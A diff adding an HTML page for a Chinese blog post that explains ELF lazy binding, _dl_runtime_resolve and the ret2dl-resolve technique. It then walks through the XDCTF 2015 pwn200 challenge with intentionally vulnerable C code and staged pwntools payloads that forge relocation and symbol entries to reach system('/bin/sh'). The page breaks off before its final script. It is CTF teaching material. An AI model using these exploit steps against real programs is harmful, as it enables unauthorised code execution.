@@ -1,0 +1,389 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>dl_runtime_resolve-details | wd-z711&#39;s B10g</title>
+  <meta name="author" content="wd-z711">
+  
+  <meta name="description" content="Common student in China. Interested in web &amp; re.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="dl_runtime_resolve-details"/>
+  <meta property="og:site_name" content="wd-z711&#39;s B10g"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'G-YHJSKZDC3Y', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="wd-z711's B10g" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">wd-z711&#39;s B10g</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> dl_runtime_resolve-details</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="dl-runtime-resolve-执行过程"><a href="#dl-runtime-resolve-执行过程" class="headerlink" title="dl_runtime_resolve 执行过程"></a>dl_runtime_resolve 执行过程</h1><p>参考链接：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://nocbtm.github.io/2020/02/24/ret2_dl_runtime_resolve/</span><br><span class="line">https://blog.csdn.net/conansonic/article/details/54634142</span><br><span class="line">https://sp4n9x.github.io/2020/08/15/ret2_dl_runtime_resolve%E8%AF%A6%E8%A7%A3/</span><br><span class="line">http://blog.blackbird.wang/2021/09/20/dl-runtime-resolve%E8%B0%83%E8%AF%95%E4%BB%A5%E5%8F%8A%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF/</span><br><span class="line">https://www.cnblogs.com/unr4v31/p/15168342.html</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<p>&emsp;动态装载器将二进制文件以及依赖库加载到内存，该过程包含了对导入符号的解析。对导入符号的解析由 <code>_dl_runtime_resolve</code> 完成。_dl_runtime_resolve 有两个参数，分别为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">link_map_obj：一个指向 link_map 结构体的指针。link_map 结构体表示一个已加载的共享对象的内部状态，包括基地址、名称、符号表等信息。</span><br><span class="line"></span><br><span class="line">reloc_index：一个整数，表示重定位表（.rel.plt 或 .rel.dyn）中的索引。重定位表包含了符号重定位信息，用于指示哪些符号需要在运行时解析，以及它们在符号表中的位置。</span><br></pre></td></tr></table></figure>
+<h2 id="重定位表相关知识"><a href="#重定位表相关知识" class="headerlink" title="重定位表相关知识"></a>重定位表相关知识</h2><p>&emsp;重定位表有两种类型：<code>.rel</code> 和 <code>.rela</code>。这两种类型对应了不同的重定位条目格式：</p>
+<ul>
+<li><code>.rel</code>：不包含附加的 addend 值的重定位条目。</li>
+<li><code>.rela</code>：包含附加的 addend 值的重定位条目。</li>
+</ul>
+<p>&emsp;addend 值是一种附加的常数，用于计算重定位的最终地址。在 <code>.rel</code> 类型的重定位条目中，addend 值并不直接存储在重定位条目中，而是存储在需要重定位的指令或数据中。在 <code>.rela</code> 类型的重定位条目中 addend 值作为重定位条目的一部分显式存储。</p>
+<p><img src="/images/dl-runtime-resolve-details/image-20240530124305950.png" alt="image-20240530124305950" style="zoom:67%;" /></p>
+<p>&emsp;重定位表有多个不同的段，比如 <code>.rel.dyn</code>（用于动态链接的常规重定位表）和 <code>.rel.plt</code>（用于 PLT 的重定位表）。</p>
+<h2 id="符号解析原理"><a href="#符号解析原理" class="headerlink" title="符号解析原理"></a>符号解析原理</h2><p><img src="/images/dl-runtime-resolve-details/image-20240530201212526.png" alt="image-20240530201212526" style="zoom:67%;" /></p>
+<p><strong>Step1：当程序导入函数时，动态链接器在<code>.dynstr</code>段中添加一个函数名称字符串。</strong></p>
+<p><strong>Step2：在<code>.dynsym</code>段中添加指向函数名称字符串的<code>Elf32 Sym</code>结构体。</strong></p>
+<p><strong>Step3：在<code>.rel.plt</code>段中添加指向<code>Elf32 Sym</code>的<code>Elf32 Rel</code>结构体。</strong></p>
+<p><strong>Step4：<code>Elf32 Rel</code>的 r_offset 构成 GOT 表，保存在 <code>.got.plt</code> 中。</strong></p>
+<h2 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h2><p>&emsp;<code>.got</code>存放所有对于外部变量引用的地址，<code>.got.plt</code>保存所有对于外部函数引用的地址，对于延迟绑定主要使用<code>.got.plt</code>表。<code>.got.plt</code>的前三项存放着特殊的地址引用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GOT[0]：保存 .dynamic 段的地址，动态链接器利用该地址提取动态链接相关的信息</span><br><span class="line">GOT[1]：保存本模块的 ID</span><br><span class="line">GOT[2]：存放了指向 _dl_runtime_resolve 函数的地址，该函数用来解析共享库函数的实际符号地址</span><br></pre></td></tr></table></figure>
+<p>&emsp;<code>.plt</code> 的通用结构如下：</p>
+<p><img src="/images/dl-runtime-resolve-details/image-20240530195306844.png" alt="image-20240530195306844" style="zoom:67%;" /></p>
+<p>&emsp;PLT[0] 用于跳转到动态链接器，进行实际的符号解析和重定位（push GOT[1]，link_map 模块的地址, jmp GOT[2]）。</p>
+<p><img src="/images/dl-runtime-resolve-details/image-20240530195505749.png" alt="image-20240530195505749" style="zoom:67%;" /></p>
+<h2 id="ret2dl-resolve"><a href="#ret2dl-resolve" class="headerlink" title="ret2dl-resolve"></a>ret2dl-resolve</h2><p>&emsp;漏洞利用通常包含两个阶段：（1）通过信息泄露获得程序的内存布局；（2）进行实际的漏洞利用。然而，<code>从程序中获得内存布局的方法并不总是可行的，且获得的被破坏的内存有时并不可靠</code>。于是有了 ret2dl-resolve，<code>其利用 ELF 格式以及动态装载器，不需要进行信息泄露，就可以直接得到函数的位置并调用</code>。</p>
+<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>&emsp;每个符号都是<code>Elf32_Sym</code>结构体的实例，这些符号共同组成了<code>.dynsym</code>段。导入符号的解析需要进行重定位，每个重定位项都是<code>Elf32_Rel</code>结构体的实例，这些项组成<code>.rel.plt</code>段（用于导入函数，无 attend）和<code>.rel.dyn</code>段(用于导入全局变量，有 attend)。Elf32_Rel 中的 r_offset 用于保存解析后的符号地址写入内存的位置（绝对地址），r_info 的高位 3 字节用于标识该符号在<code>.dynsym</code>段中的位置。</p>
+<p>&emsp;每个导入函数在 PLT 表中有一个条目，其第 1 条指令无条件跳转到对应 GOT 条目保存的地址处。而每个 GOT 条目在初始化时都默认指向对应 PLT 条目的第 2 条指令的位置，第 2 条指令的执行逻辑为：将导入函数的标识（<code>Elf32_Rel</code> 在 <code>.rel.plt</code> 段中的偏移）压栈然后跳转到 PLT0 执行。PLT0 的执行逻辑为：先将 GOT[1] 压栈，然后跳转到 GOT[2]，也就是 <code>_dl_runtime_resolve</code>。<code>_dl_runtime_resolve</code> 是使用汇编实现的。</p>
+<p>&emsp;Partial RELRO 指 .dynamic 段在内的段会被标识为只读。Full RELRO 指在 Partial RELRO 的基础上，禁用延迟绑定，即所有的导入符号在加载时就被解析，<code>.got.plt</code>段（导入外部符号）被完全初始化为目标函数的地址，并标记为只读。于是有两个攻击场景：</p>
+<ul>
+<li>关闭 RELRO 保护，使 .dynamic 段可写时。由于动态装载器是从 <code>.dynamic</code> 段的 DT_STRTAB 条目中来获取 <code>.dynstr</code> 段的地址，而 DT_STRTAB 的位置是已知的，且默认情况下可写，所以攻击者能够改写 DT_STRTAB 的内容，欺骗动态装载器，使它以为 <code>.dynstr</code> 在 <code>.bss</code> 上，同时在那里伪造一个假的字符串表。当动态装载器尝试解析 <code>printf</code> 时就会使用不同的基地址来寻找函数名，最终执行的是 <code>execve</code>。</li>
+</ul>
+<p><img src="/images/dl-runtime-resolve-details/image-20240530215707384.png" alt="image-20240530215707384" style="zoom:67%;" /></p>
+<ul>
+<li>开启 Partial RELRO 保护，使 .dynamic 段不可写时。<code>_dl_runtime_resolve</code> 的第二个参数 <code>reloc_index</code> 对应 Elf32_Rel 在 <code>.rel.plt</code> 段中的偏移，动态装载器将偏移加上 <code>.rel.plt</code> 的基地址来得到目标 <code>Elf_Rel</code> 的内存地址。当这个内存地址落在 <code>.bss</code> 段中时，攻击者就可以伪造一个 Elf32_Rel，使 r_offset 是一个可写的内存地址且将解析后的函数地址写在那里。</li>
+</ul>
+<h4 id="XDCTF-2015-pwn200"><a href="#XDCTF-2015-pwn200" class="headerlink" title="XDCTF 2015: pwn200"></a>XDCTF 2015: pwn200</h4><p>Step1：题目环境构建。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">vuln</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="comment">// 当从标准输入读取数据时，数据将首先存储在 buf 缓冲区中，直到缓冲区满或遇到换行符等情况时才实际进行读操作</span></span><br><span class="line">    <span class="built_in">setbuf</span>(stdin, buf);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>] = <span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>;</span><br><span class="line">    <span class="built_in">setbuf</span>(stdout, buf);</span><br><span class="line">    <span class="built_in">write</span>(<span class="number">1</span>, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    <span class="built_in">vuln</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// gcc -m32 -fno-stack-protector -no-pie main.c -o pwn200</span></span><br></pre></td></tr></table></figure>
+<p>Step2：找漏洞点。很容易找到有栈溢出。</p>
+<p><img src="/images/dl-runtime-resolve-details/image-20240530221513695.png" alt="image-20240530221513695" style="zoom:67%;" /></p>
+<p>Step3：由于程序开了 Partial RELRO，我们可以从 ret2dl-resolve 的方面考虑问题。思路是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">（1）利用栈溢出控制执行流，调用 read 函数将下一阶段的 payload 读到 .bss 段上，然后用 stack pivot 将栈转移到 .bss 段。</span><br><span class="line">（2）从调用 write(1, &quot;/bin/sh&quot;, 7) 的第二阶段 payload 开始，一步步将其改造成 ret2dl-resolve 的 payload，最终目的是实现调用 system(&quot;/bin/sh&quot;)。</span><br><span class="line">    （a）模拟 write@plt 执行的效果，即先将 reloc_index 压栈，再跳转到 PLT0。</span><br><span class="line">    （b）在 .bss 段上伪造 Elf32_Rel。其中，r_offset 设置为 write@got，表示将函数解析后的内存地址存放到该位置。r_info 则照搬，设置为 0x607，动态加载器会通过这个值找到对应的 Elf32_Sym。相应地 reloc_index 也要调整为 fake_reloc 相对于 .rel.plt  段的偏移。</span><br><span class="line">    （c）在 .bss 上伪造 Elf32_Sym。动态加载器会通过 st_name 找到 .dynstr 段中的函数名字符串 &quot;write&quot;。fake_reloc 也要做调整，r_info 可以通过 r_sym 和 r_type 计算得出。其中，r_sym 是 Elf32_Sym 相对于 .dynsym 段的下标偏移，r_type 则照搬 R_386_JUMP_SLOT 的值 0x7。</span><br><span class="line">    （d）在 .bss 段上伪造 .dynstr，也就是放上 &quot;write&quot; 字符串。调整 fake_sym 的 st_name 指向伪造的函数名字符串，然后还可以通过 st_bind 和 st_type 来计算 st_info。</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># (1) 利用栈溢出控制执行流，调用 read 函数将下一阶段的 payload 读到 .bss 段上，然后用 stack pivot 将栈转移到 .bss 段</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn200&quot;</span>)</span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">bss_addr = elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr + <span class="number">0x500</span></span><br><span class="line">pppr_addr = <span class="number">0x08049351</span> <span class="comment"># pop esi; pop edi; pop ebp; ret;</span></span><br><span class="line">pop_ebp_addr = <span class="number">0x08049353</span> </span><br><span class="line">leave_addr = <span class="number">0x08049165</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&quot;A&quot;</span> * (<span class="number">108</span> + <span class="number">4</span>)</span><br><span class="line">payload1 += p32(read_plt)                     <span class="comment"># 32 位的 ELF 的参数在栈上保存，用于读取 payload2</span></span><br><span class="line">payload1 += p32(pppr_addr)                    <span class="comment"># 清理参数</span></span><br><span class="line">payload1 += p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">100</span>) <span class="comment"># 参数 1/2/3</span></span><br><span class="line">payload1 += p32(pop_ebp_addr)</span><br><span class="line">payload1 += p32(bss_addr) <span class="comment"># ebp = bss_addr</span></span><br><span class="line">payload1 += p32(leave_addr) <span class="comment"># mov esp, ebp; pop ebp; pop eip; 使得 esp = bss_addr</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#（2）从调用 write(1, &quot;/bin/sh&quot;, 7) 的第二阶段 payload 开始，一步步将其改造成 ret2dl-resolve 的 payload，最终目的是实现调用 system(&quot;/bin/sh&quot;)</span></span><br><span class="line">payload2 = <span class="string">b&quot;AAAA&quot;</span> <span class="comment"># ebp = &quot;AAAA&quot;</span></span><br><span class="line">payload2 += p32(write_plt) <span class="comment"># eip = write_plt</span></span><br><span class="line">payload2 += <span class="string">b&quot;CCCC&quot;</span> <span class="comment"># 返回地址，暂时设置为 CCCC</span></span><br><span class="line">payload2 += p32(<span class="number">1</span>) + p32(bss_addr + <span class="number">80</span>) + p32(<span class="built_in">len</span>(<span class="string">b&quot;/bin/sh&quot;</span>)) <span class="comment"># 执行 write(1, &quot;/bin/sh&quot;, 7)</span></span><br><span class="line">payload2 += <span class="string">b&quot;A&quot;</span> * (<span class="number">80</span> - <span class="built_in">len</span>(payload2))</span><br><span class="line">payload2 += <span class="string">b&quot;/bin/sh\x00&quot;</span> <span class="comment"># 在 bss 偏移 80 处写入 /bin/sh</span></span><br><span class="line">payload2 += <span class="string">b&quot;A&quot;</span> * (<span class="number">100</span> - <span class="built_in">len</span>(payload2))</span><br></pre></td></tr></table></figure>
+<p>&emsp;之后，对（2）的脚本做修改，以模拟 write_plt 的执行效果，最终目的是执行 system。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#（2）（a）模拟 write@plt 执行的效果，即先将 reloc_index 压栈，再跳转到 PLT0</span></span><br><span class="line">plt_0 = elf.get_section_by_name(<span class="string">&#x27;plt&#x27;</span>).header.sh_addr</span><br><span class="line">reloc_index = <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&quot;AAAA&quot;</span></span><br><span class="line">payload2 += p32(plt_0)             <span class="comment"># 修改点1，跳到 plt0 执行</span></span><br><span class="line">payload2 += p32(reloc_index)       <span class="comment"># 修改点2，0x20 是 plt0 执行时的参数</span></span><br><span class="line">payload2 += <span class="string">b&quot;CCCC&quot;</span></span><br><span class="line">payload2 += p32(<span class="number">1</span>) + p32(bss_addr + <span class="number">80</span>) + p32(<span class="built_in">len</span>(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">payload2 += <span class="string">b&quot;A&quot;</span> * (<span class="number">80</span> - <span class="built_in">len</span>(payload2))</span><br><span class="line">payload2 += <span class="string">b&quot;/bin/sh\x00&quot;</span> <span class="comment"># 在 bss 偏移 80 处写入 /bin/sh</span></span><br><span class="line">payload2 += <span class="string">b&quot;A&quot;</span> * (<span class="number">100</span> - <span class="built_in">len</span>(payload2))</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#（2）（b）在 .bss 段上伪造 Elf32_Rel。其中，r_offset 设置为 write@got，表示将函数解析后的内存地址存放到该位置。r_info 则照搬，设置为 0x607，动态加载器会通过这个值找到对应的 Elf32_Sym。相应地 reloc_index 也要调整为 fake_reloc 相对于 .rel.plt  段的偏移。</span></span><br><span class="line">plt_0 = elf.get_section_by_name(<span class="string">&#x27;plt&#x27;</span>).header.sh_addr</span><br><span class="line">reloc_index = bss_addr + <span class="number">28</span> - rel_plt</span><br><span class="line">write_got = <span class="number">0x0</span> <span class="comment"># write 真实的函数地址，暂时不写</span></span><br><span class="line">r_info = <span class="number">0x607</span> </span><br><span class="line"></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info) <span class="comment"># 伪造的 Elf32_Rel</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&quot;AAAA&quot;</span></span><br><span class="line">payload2 += p32(plt_0)            </span><br><span class="line">payload2 += p32(reloc_index)  </span><br><span class="line">payload2 += <span class="string">b&quot;CCCC&quot;</span></span><br><span class="line">payload2 += p32(<span class="number">1</span>) + p32(bss_addr + <span class="number">80</span>) + p32(<span class="built_in">len</span>(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">payload2 += fake_reloc <span class="comment"># 修改点1，伪造 Elf32_Rel，reloc 其实是 rel_plt+reloc_index 指向的，现在 rel_plt+reloc_index 指向 fake_reloc，reloc_index 也要修改，位置为 bss_addr + 28</span></span><br><span class="line">payload2 += <span class="string">b&quot;A&quot;</span> * (<span class="number">80</span> - <span class="built_in">len</span>(payload2)) </span><br><span class="line">payload2 += <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">payload2 += <span class="string">b&quot;A&quot;</span> * (<span class="number">100</span> - <span class="built_in">len</span>(payload2))</span><br></pre></td></tr></table></figure>
+<p>&emsp;（2）（b）中，r_info 的获得途径为：</p>
+<p><img src="/images/dl-runtime-resolve-details/image-20240531151006667.png" alt="image-20240531151006667" style="zoom:67%;" /></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#（2）（c）在 .bss 上伪造 Elf32_Sym。动态加载器会通过 st_name 找到 .dynstr 段中的函数名字符串 &quot;write&quot;。fake_reloc 也要做调整，r_info 可以通过 r_sym 和 r_type 计算得出。其中，r_sym 是 Elf32_Sym 相对于 .dynsym 段的下标偏移，r_type 则照搬 R_386_JUMP_SLOT 的值 0x7</span></span><br><span class="line"></span><br><span class="line">plt_0 = elf.get_section_by_name(<span class="string">&#x27;plt&#x27;</span>).header.sh_addr</span><br><span class="line">reloc_index = bss_addr + <span class="number">28</span> - rel_plt</span><br><span class="line">write_got = <span class="number">0x0</span></span><br><span class="line">r_sym = (bss_addr + <span class="number">40</span> - dynsym) / <span class="number">0x10</span>  <span class="comment"># symbol_index</span></span><br><span class="line">r_type = <span class="number">0x7</span>                             <span class="comment"># R_i386_JMP_SLOT</span></span><br><span class="line">r_info = (r_sym &lt;&lt; <span class="number">8</span>) + (r_type &amp; <span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">fake_sym = p32(<span class="number">0x4c</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>) <span class="comment"># st_name = 0x4c, st_info = 0x12</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&quot;AAAA&quot;</span></span><br><span class="line">payload2 += p32(plt_0)            </span><br><span class="line">payload2 += p32(reloc_index)  </span><br><span class="line">payload2 += <span class="string">b&quot;CCCC&quot;</span></span><br><span class="line">payload2 += p32(<span class="number">1</span>) + p32(bss_addr + <span class="number">80</span>) + p32(<span class="built_in">len</span>(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">payload2 += fake_reloc</span><br><span class="line">payload2 += <span class="string">b&quot;AAAA&quot;</span></span><br><span class="line">payload2 += fake_sym <span class="comment"># 修改点1，伪造 Elf32_Sym，并修改 r_info，使其指向伪造的 Elf32_Sym，位置为 bss_addr + 40</span></span><br><span class="line">payload2 += <span class="string">b&quot;A&quot;</span> * (<span class="number">80</span> - <span class="built_in">len</span>(payload2)) </span><br><span class="line">payload2 += <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">payload2 += <span class="string">b&quot;A&quot;</span> * (<span class="number">100</span>-<span class="built_in">len</span>(payload2))</span><br></pre></td></tr></table></figure>
+<p>&emsp;（2）（c）中，可以查看 write 的 Elf32_sym，从而进行伪造：</p>
+<p><img src="/images/dl-runtime-resolve-details/image-20240531160115740.png" alt="image-20240531160115740" style="zoom:67%;" /></p>
+<p><img src="/images/dl-runtime-resolve-details/image-20240531160242048.png" alt="image-20240531160242048" style="zoom:67%;" /></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#（2）（d）在 .bss 段上伪造 .dynstr，也就是放上 &quot;write&quot; 字符串。调整 fake_sym 的 st_name 指向伪造的函数名字符串，然后还可以通过 st_bind 和 st_type 来计算 st_info。</span></span><br><span class="line">plt_0 = elf.get_section_by_name(<span class="string">&#x27;plt&#x27;</span>).header.sh_addr</span><br><span class="line">reloc_index = bss_addr + <span class="number">28</span> - rel_plt</span><br><span class="line"></span><br><span class="line">write_got = <span class="number">0x0</span></span><br><span class="line">r_sym = (bss_addr + <span class="number">40</span> - dynsym) / <span class="number">0x10</span> </span><br><span class="line">r_type = <span class="number">0x7</span>                         </span><br><span class="line">r_info = (r_sym &lt;&lt; <span class="number">8</span>) + (r_type &amp; <span class="number">0xff</span>)</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line"></span><br><span class="line">st_name = bss_addr + <span class="number">56</span> - dynstr</span><br><span class="line">st_bind = <span class="number">0x1</span></span><br><span class="line">st_type = <span class="number">0x2</span></span><br><span class="line">st_info = (st_bind &lt;&lt; <span class="number">4</span>) + (st_type &amp; <span class="number">0xf</span>) <span class="comment"># 0x12</span></span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(st_info) </span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&quot;AAAA&quot;</span></span><br><span class="line">payload2 += p32(plt_0)            </span><br><span class="line">payload2 += p32(reloc_index)  </span><br><span class="line">payload2 += <span class="string">b&quot;CCCC&quot;</span></span><br><span class="line">payload2 += p32(<span class="number">1</span>) + p32(bss_addr + <span class="number">80</span>) + p32(<span class="built_in">len</span>(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">payload2 += fake_reloc</span><br><span class="line">payload2 += <span class="string">b&quot;AAAA&quot;</span></span><br><span class="line">payload2 += fake_sym </span><br><span class="line">payload2 += <span class="string">b&quot;write\x00&quot;</span> <span class="comment"># 修改点1，伪造 .dynstr，bss_addr + 56 </span></span><br><span class="line">payload2 += <span class="string">b&quot;A&quot;</span> * (<span class="number">80</span> - <span class="built_in">len</span>(payload2)) </span><br><span class="line">payload2 += <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">payload2 += <span class="string">b&quot;A&quot;</span> * (<span class="number">100</span>-<span class="built_in">len</span>(payload2))</span><br></pre></td></tr></table></figure>
+<p>Step4：直接上脚本：</p>
